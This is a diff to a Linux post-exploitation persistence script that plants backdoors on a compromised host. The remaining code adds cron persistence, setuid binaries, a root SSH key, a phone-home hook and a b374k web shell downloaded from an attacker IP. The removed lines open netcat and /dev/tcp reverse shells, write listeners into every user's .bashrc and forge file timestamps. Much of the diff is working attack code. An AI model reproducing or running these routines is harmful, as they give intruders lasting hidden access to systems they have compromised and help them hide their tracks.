@@ -45,7 +45,7 @@ YUM=""
 APTGET=""
 osType=""
 attackIP=""
-RED="\e[0;31m"
+RED="\e[0;31m" 
 GREEN="\e[0;32m"
 YELLOW="\e[0;33m"
 END="\e[0m"
@@ -54,13 +54,14 @@ targetIP=$(ifconfig | "${GREP}" inet | "${GREP}" -v inet6 | "${GREP}" -v 127| "$
 main () {
    if [ "$(${ID} -u)" != "0" ]
    then
-      attackIP=$(deobf "${attackIP}")
+      #attackIP=$(deobf "${attackIP}")
+      attackIP="${attackIP}"
 
       # Gather node information
       # Uncomment if you are in an online environment
       #auditURL="https://github.com/CISOfy/lynis/archive/master.zip"
       # Comment out if you are in an online environment - For use in offline environments
-      auditURL="http://${attackIP/lynus/master.zip   
+      auditURL="http://${attackIP}/lynus/master.zip"
 
       if [ ! -d ~/Documents/.user/.audit ]
       then
@@ -124,9 +125,6 @@ main () {
        echo ""
        echo "[+] Adding Cron"
        addCron
-       echo ""
-       echo "[+] Adding Listener"
-       addListen
        echo ""
        echo "[+] Adding Setuid Permissions"
        setUID
@@ -628,206 +626,6 @@ addUser() {
    esac
 }
 
-# Check for active listerners (e.g. - nc)
-# Port list is defined using commonly used ports
-checkListen() {
-   portArr=("22" "25" "53" "80" "110" "143" "443" "8080")
-
-   for ((  i=0; i<${#portArr[@]}; i++ ))
-   do
-      "${NETSTAT}" -lant | "${GREP}" -q "${portArr[${i}]}" >> /dev/null
-      case $? in
-        0)
-          echo -e "\t* [${YELLOW}INFO${END}] => Port: ${portArr[${i}]} in use!"
-          echo -e "\t* [${YELLOW}INFO${END}] => Checking if Port: ${portArr[${i}]} is in use by nc..."
-
-          "${PGREP}" -f "${NC} -l -p ${portArr[${i}]} -e /bin/bash" > /dev/null
-          case $? in
-            0)
-              echo -e "\t* [${YELLOW}INFO${END}] => Port: ${portArr[${i}]} is in use by nc. Netcat is running!"
-              break
-            ;;
-            1)
-              echo -e "\t* [${YELLOW}INFO${END}] => Port: ${portArr[${i}]} is not in use by nc. Checking next available port!"
-            ;;
-            *)
-              echo -e "\t- [${RED}FAILURE${END}] => Failed to determine if nc is using ${portArr[${i}]}"
-            ;;
-          esac
-        ;;
-        1)
-          echo -e "\t* [${YELLOW}INFO${END}] => Port: ${portArr[${i}]} is not in use!"
-          break
-        ;;
-        *)
-          echo -e "\t- [${RED}FAILURE${END}] => Could not determine listening ports!"
-        ;;
-      esac
-   done
-
-   "${PGREP}" -f "${NC} -l -p ${portArr[${i}]} -e /bin/bash" > /dev/null
-   if [ $? = 0 ]
-   then
-     echo -e "\t* [${YELLOW}INFO${END}] => Netcat is running!"
-   elif [ $? = 1 ]
-   then
-     echo -e "\t* [${YELLOW}INFO${END}] => Netcat is not running! Attempting to start..."
-     "${NC}" -l -p "${portArr[${i}]}" -e /bin/bash &
-  
-     "${PGREP}" -f "${NC} -l -p ${portArr[${i}]} -e /bin/bash" > /dev/null
-     case $? in
-       0)
-          echo -e "\t+ [${GREEN}SUCCESS${END}] => Netcat is now running using port ${portArr[${i}]}!"
-       ;;
-       1)
-          echo -e "\t- [${RED}FAILURE${END}] => Netcat failed to start!"
-       ;;
-       *)
-          echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred. Netcat may not support the -e option!"
-       ;;
-     esac
-   else
-     echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred. Could not determine if Netcat is running!"
-     :' 
-       ## Commented out because we cannot background bash -i shell lisener ##
-       echo ""
-       echo -e "\t* [${YELLOW}INFO${END}] => Failing back to bash listener...!"
-
-       # Attacker needs to have a listener set up on on his/her system
-       # nc -lp 4545 -vvv
-       attackIP=$(deobf "${attackIP}")
-
-       # Copy connection over stdin
-       exec 0</dev/tcp/"${attackIP}"
-       # Copy stdin to stdout
-       exec 1>&0
-       # Copy stdin to stderr
-       exec 2>&0
-
-       /bin/bash -i 0</dev/tcp/"${attackIP}"/4545 1>&0 2>&0
-       case $? in
-         0)
-           echo -e "\t+ [${GREEN}SUCCESS${END}] => Backup listener is set!"
-         ;;
-         1)
-           echo -e "\t- [${RED}FAILURE${END}] => Failed to launch backup listener!"
-         ;;
-         *)
-           echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred. Could not determine if Bash listener is running!"
-           echo ""
-           echo -e "\t* [${YELLOW}INFO${END}] => Failing back to shell listener...!"
-
-           exec 5<>/dev/tcp/"${attackIP}"/4545
-           cat <&5 | while read -r line; do ${line} 2>&5 >&5; done
-           case $? in
-             0)
-               echo -e "\t+ [${GREEN}SUCCESS${END}] => Backup shell listener is set!"
-             ;;
-             1)
-               echo -e "\t- [${RED}FAILURE${END}] => Failed to launch backup shell listener!"
-             ;;
-             *)
-               echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred. Could not determine if shell listener is running!"
-               echo ""
-             ;;
-           esac
-         ;;
-       esac
-     ' # End commented out section due to the inability to background /dev/tcp shell
-     fi
-
-   # Add netcat listener to all users .bashrc
-   for user in /home/*
-   do
-      timestamp=$(getTime "${user}/.bashrc")
-
-      "${GREP}" -q "${NC} -l -p 2048 -e /bin/bash" "${user}/.bashrc"
-      if [ $? == 0 ]
-      then
-         echo -e "\t* [${YELLOW}INFO${END}] => .bashrc already contains nc listener: ${user}/.bashrc"
-      elif [ $? == 1 ]
-      then
-         echo "${NC} -l -p 2048 -e /bin/bash" >> "${user}/.bashrc"
-
-         "${GREP}" -q "${NC} -l -p 2048 -e /bin/bash" "${user}/.bashrc"
-         case $? in
-            0)
-               echo -e "\t+ [${GREEN}SUCCESS${END}] => Listener successfully added to ${user}/.bashrc"
-            ;;
-            1)
-               echo -e "\t- [${RED}FAILURE${END}] => Failed to add Listener to ${user}/.bashrc"
-            ;;
-            *)
-               echo -e "\t- [${RED}FAILURE${END}] => An unknown error has occured. Netcat may not support the -e option!"
-            ;;
-         esac
-      else
-         echo -e "\t- [${RED}FAILURE${END}] => An unknown error has occured!"
-      fi
-
-      setTime "${timestamp}" "${user}/.bashrc"
-      verifyTime "${user}/.bashrc" "${timestamp}"
-   done
-}
-
-# Sets up a bash listener in the
-# Event that netcat doesn't support the -e option
-bashListen(){
-   attackIP=$(deobf "${attackIP}")
-   echo ""
-
-   "${RM}" -rf /tmp/.root/.home/.user/.shell
-   "${MKFIFO}" /tmp/.root/.home/.user/.shell
-
-   cat /tmp/.root/.home/.user/.shell | /bin/sh -i 0<&1 2>&1 | "${NC}" "${attackIP}" 443 >/tmp/.root/.home/.user/.shell
-   case $? in
-     0)
-       echo -e "\t+ [${GREEN}SUCCESS${END}] => Backup shell listener is set!"
-     ;;
-     1)
-       echo -e "\t- [${RED}FAILURE${END}] => Failed to launch backup shell listener!"
-     ;;
-     *)
-       echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred...Could not determine if shell listener is running!"
-       echo ""
-     ;;
-   esac
-}
-
-# Add a listener to the target.
-addListen() {
-   "${WHICH}" nc > /dev/null
-   case $? in
-     0)
-       echo -e "\t* [${YELLOW}INFO${END}] => Netcat (nc) is installed!"
-       echo -e "\t* [${YELLOW}INFO${END}] => Checking if '-e' option is availale..."
-    
-       man nc | "${GREP}" -q "\-e file"
-       case $? in
-         0)
-           echo -e "\t* [${YELLOW}INFO${END}] => Netcat (nc) supports the '-e' option!"
-           checkListen
-         ;;
-         1)
-           echo -e "\t- [${RED}FAILURE${END}] => Netcat does not support the '-e' option, falling back to a bash listener..."
-           bashListen
-         ;;
-         *)
-           echo -e "\t- [${RED}FAILURE${END}] => Could not determine if Netcat(nc) supports the '-e' option!"
-         ;;
-       esac
-     ;;
-     1)
-       echo -e "\t- [${RED}FAILURE${END}] => Netcat (nc) is not installed!"
-       echo -e "\t* [${YELLOW}INFO${END}] => Attempting to start bash listener..."
-       bashListen
-     ;;
-     *)
-       echo -e "\t- [${RED}FAILURE${END}] => Culd not determine if Netcat (nc) is installed or not!"
-     ;;
-   esac
-}
-
 # Add a cron job to run this script
 # Every 5 minutes to maintain access
 addCron() {
@@ -928,7 +726,8 @@ addCron() {
 # That sets up phone home functionality.
 # Used in conjunction with the snort.php file.
 phoneHome() {
-   attackIP=$(deobf "${attackIP}")
+   #attackIP=$(deobf "${attackIP}")
+   attackIP="${attackIP}"
    obfString=$(obf "~xXxGen<Owned By G0dz1ll4>GenxXx~")
 
    if [ -f /etc/cron.hourly/snort ]
@@ -1433,12 +1232,13 @@ checkNoLogin() {
 getWebShell() {
    docRoot=""
 
-   attackIP=$(deobf "${attackIP}")
+   #attackIP=$(deobf "${attackIP}")
+   attackIP="${attackIP}"
 
    # Uncomment if you are in an online environment
    #shellURL="https://github.com/b374k/b374k/archive/master.zip"
    # Comment out if you are in an online environment - For use in offline environments
-   shellURL="http://${attackIP}/b374k/master.zip
+   shellURL="http://${attackIP}/b374k/master.zip"
    targetIP=$(ifconfig | "${GREP}" inet | "${GREP}" -v inet6 | "${GREP}" -v 127| "${AWK}" -F":" '{ print $2 }' | "${AWK}" '{ print $1 }')
  
    "${GREP}" -q "www-data" /etc/sudoers
@@ -1480,11 +1280,11 @@ getWebShell() {
       "${RPM}" -qa | "${GREP}" httpd > /dev/null
       case $? in
          0)
-            echo -e "\t* [${YELLOW}INFO${END}] => Apache (httpd) is installed. Checking to see if it is running..."
+            echo -e "\t* [${YELLOW}INFO${END}] => Apache \(httpd\) is installed. Checking to see if it is running..."
             "${PGREP}" httpd > /dev/null
             if [ $? == 0 ]
             then
-               echo -e "\t* [${YELLOW}INFO${END}] => Apache (httpd) is running!"
+               echo -e "\t* [${YELLOW}INFO${END}] => Apache \(httpd\) is running!"
                if [ ! -f "${docRoot}/image/index.php" ]
                then
                  echo -e "\t* [${YELLOW}INFO${END}] => Downloading shell..."
@@ -1516,7 +1316,7 @@ getWebShell() {
                fi
             elif [ $? == 1 ]
             then
-              echo -e "\t* [${YELLOW}INFO${END}] => Apache (httpd) is not running...Attempting to start..."
+              echo -e "\t* [${YELLOW}INFO${END}] => Apache \(httpd\) is not running...Attempting to start..."
                "${SERVICE}" httpd start
 
                "${PGREP}" httpd > /dev/null            
@@ -1526,7 +1326,7 @@ getWebShell() {
 
                  if [ ! -f "${docRoot}/image/index.php" ]
                  then
-                   echo -e "\t* [${YELLOW}INFO${END}] => Apache (httpd) is running...Downloading shell..."
+                   echo -e "\t* [${YELLOW}INFO${END}] => Apache \(httpd\) is running...Downloading shell..."
 
                    "${WGET}" -P "${docRoot}" "${shellURL}" -o /dev/null
                    cd "${docRoot}" || exit 1
@@ -1546,14 +1346,14 @@ getWebShell() {
                  echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred!"
                fi
             else
-               echo -e "\t* [${YELLOW}INFO${END}] => Could not determine if Apache (httpd) is running!"
+               echo -e "\t* [${YELLOW}INFO${END}] => Could not determine if Apache \(httpd\) is running!"
             fi
          ;;
          1)
-            echo -e "\t* [${YELLOW}INFO${END}] => Apache (httpd) is not installed!"
+            echo -e "\t* [${YELLOW}INFO${END}] => Apache \(httpd\) is not installed!"
          ;;
          *)
-            echo -e "\t- [${RED}FAILURE${END}] => Could not determine if  Apache (httpd) is installed!"
+            echo -e "\t- [${RED}FAILURE${END}] => Could not determine if  Apache \(httpd\) is installed!"
          ;;
       esac
 
@@ -1600,12 +1400,12 @@ getWebShell() {
       "${DPKG}" -l | "${GREP}" apache2 > /dev/null
       case $? in
          0)
-            echo -e "\t* [${YELLOW}INFO${END}] => Apache (apache2) is installed. Checking to see if it is running..."
+            echo -e "\t* [${YELLOW}INFO${END}] => Apache \(apache2\) is installed. Checking to see if it is running..."
 
             "${PGREP}" apache2 > /dev/null
             if [ $? == 0 ]
             then
-               echo -e "\t* [${YELLOW}INFO${END}] => Apache (apache2) is running!"
+               echo -e "\t* [${YELLOW}INFO${END}] => Apache \(apache2\) is running!"
 
                if [ ! -f "${docRoot}/image/index.php" ]
                then
@@ -1642,7 +1442,7 @@ getWebShell() {
                fi
             elif [ $? == 1 ]
             then
-               echo -e "\t* [${YELLOW}INFO${END}] => Apache (apache2) is not running...Attempting to start..."
+               echo -e "\t* [${YELLOW}INFO${END}] => Apache \(apache2\) is not running...Attempting to start..."
                "${SERVICE}" apache2 start
 
                "${PGREP}" apache2 > /dev/null
@@ -1651,7 +1451,7 @@ getWebShell() {
                  echo -e "\t+ [${GREEN}SUCCESS${END}] => Apache Started."
                  if [ ! -f "${docRoot}/image/index.php" ]
                  then
-                   echo -e "\t* [${YELLOW}INFO${END}] => Apache (apache2) is running...Downloading shell..."
+                   echo -e "\t* [${YELLOW}INFO${END}] => Apache \(apache2\) is running...Downloading shell..."
 
                    "${WGET}" -P "${docRoot}" "${shellURL}" -o /dev/null
                    cd "${docRoot}" || exit 1
@@ -1670,14 +1470,14 @@ getWebShell() {
                  echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred!"
                fi
             else
-               echo -e "\t* [${YELLOW}INFO${END}] => Could not determine if Apache (apache2) is running!"
+               echo -e "\t* [${YELLOW}INFO${END}] => Could not determine if Apache \(apache2\) is running!"
             fi
          ;;
          1)
-            echo -e "\t* [${YELLOW}INFO${END}] => Apache (apache2) is not installed!"
+            echo -e "\t* [${YELLOW}INFO${END}] => Apache \(apache2\) is not installed!"
          ;;
          *)
-            echo -e "\t- [${RED}FAILURE${END}] => Could not determine if  Apache (apache2) is installed!"
+            echo -e "\t- [${RED}FAILURE${END}] => Could not determine if  Apache \(apache2\) is installed!"
          ;;
       esac
 
@@ -1980,7 +1780,7 @@ do
                  echo "${sshKey}" >> /root/.ssh/authorized_keys
                fi
 
-               keyPerms=$("${STAT}" -c %a /root/.ssh/authorized_key)
+               keyPerms=$("${STAT}" -c %a /root/.ssh/authorized_keys)
                if [ "${keyPerms}" == "640" ]
                then
                  echo -e "\t* [${YELLOW}INFO${END} => SSH Key already have the proper permissions set!" >> "${LOG}"
